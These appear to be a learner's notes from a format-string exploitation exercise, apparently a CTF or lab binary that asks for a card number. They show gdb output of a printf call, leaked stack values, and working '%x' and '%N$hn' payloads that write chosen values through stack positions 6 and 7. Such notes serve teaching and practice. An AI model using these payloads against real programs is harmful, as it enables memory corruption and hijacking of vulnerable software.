
%rdi, %rsi, %rdx, %rcx, %r8 and %r9

```
printf@plt (
   $rdi = 0x00007fffffffdd30 → "%x:%x:%x:%x:%x:%x:%x:%x\n@\t@UUU",
   $rsi = 0x00007fffffffb680 → "\nYour card is: ard.. Something is wrong!\n\nInser[...]",
   $rdx = 0x00007ffff7bed8c0 → 0x0000000000000000
)


Continuing.
ffffb680:f7bed8c0:0:f:0:deadbeef:ffffdd20:253a7825
%x:%x:%x:%x:%x:%x
%6$x
%47798x%6$hn%4160x%7$hn
@       @UUU
```

![[Pasted image 20230620112415.png]]


our stack has the point to the location we want to write to at position 7, poistion 6 is the value

```
%4919x%7$hn
%<number of padding>%<poistion in stack>$hn

```

